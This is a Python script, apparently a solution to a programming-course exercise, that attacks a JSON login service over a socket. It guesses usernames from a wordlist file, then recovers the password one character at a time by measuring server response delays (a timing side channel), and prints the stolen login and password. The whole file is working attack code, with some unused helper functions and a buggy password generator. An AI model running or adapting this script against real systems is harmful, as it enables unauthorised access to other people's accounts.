import socket
import sys
import itertools
import string
import json
from datetime import datetime, timedelta

hostname = sys.argv[1]
port = int(sys.argv[2])
characters = string.ascii_letters + string.digits
login = ''
password = ''
time_lags = []


def iter_word_from(file_name: str) -> str:
    # `with` handles open/closing file including exception at the end of the file
    # `for` is iterator that can deal with large files
    with open(file_name, 'r') as f:
        for line in f:
            yield line.strip()


# takes `string` and yields its all possible iterations in varying cAsE
def vary_bad_password(bad_pass: str) -> str:
    bad_password = map(''.join, itertools.product(*((c.lower(), c.upper()) for c in bad_pass)))
    for bp in bad_password:
        yield bp


# iteration of all possible lowercase `characters` combinations
def generate_password():
    pas_len = 0
    while True:
        pas_len += 1
        for p in itertools.product(characters, repeat=pas_len):
            yield ''.join(*p)


def json_authorization_encoded(lgn, pswd):
    lp_dict = {'login': lgn,
               'password': pswd}
    return json.dumps(lp_dict).encode()


def take_char():
    char_iterator = itertools.cycle(characters)
    for c in char_iterator:
        yield c


def main():
    global time_lags
    global login
    global password
    with socket.socket() as client_sock:
        client_sock.connect((hostname, port))
        login_iterator = iter_word_from('logins.txt')
        # figuring out login
        while True:
            try:
                temp_login = next(login_iterator)
                message = json_authorization_encoded(temp_login, ' ')
                start = datetime.now()
                client_sock.send(message)
                response = json.loads(client_sock.recv(1024).decode())
                end = datetime.now()
                time_lags.append((end - start) / timedelta(microseconds=1))
                if response['result'] == 'Wrong login!':
                    continue
                elif response['result'] == 'Wrong password!':
                    login = temp_login
                    break
            except (ConnectionAbortedError, StopIteration):
                continue
        # figuring out password
        char_iterator = take_char()
        # print(time_lags)
        mean_time_lag = sum(time_lags) / len(time_lags)
        while True:
            try:
                next_char = next(char_iterator)
                message = json_authorization_encoded(login, password + next_char)
                start = datetime.now()
                client_sock.send(message)
                response = json.loads(client_sock.recv(1024).decode())
                end = datetime.now()
                long_time_lag = (end - start) / timedelta(microseconds=1)
                if response['result'] == 'Wrong password!' and (long_time_lag - mean_time_lag <= 500):
                    continue
                elif response['result'] == 'Wrong password!' and (long_time_lag - mean_time_lag > 500):
                    password += next_char
                    continue
                elif response['result'] == 'Connection success!':
                    password += next_char
                    break
            except ConnectionAbortedError:
                continue
        print(json.dumps({"login": login, "password": password}))


if __name__ == '__main__':
    main()
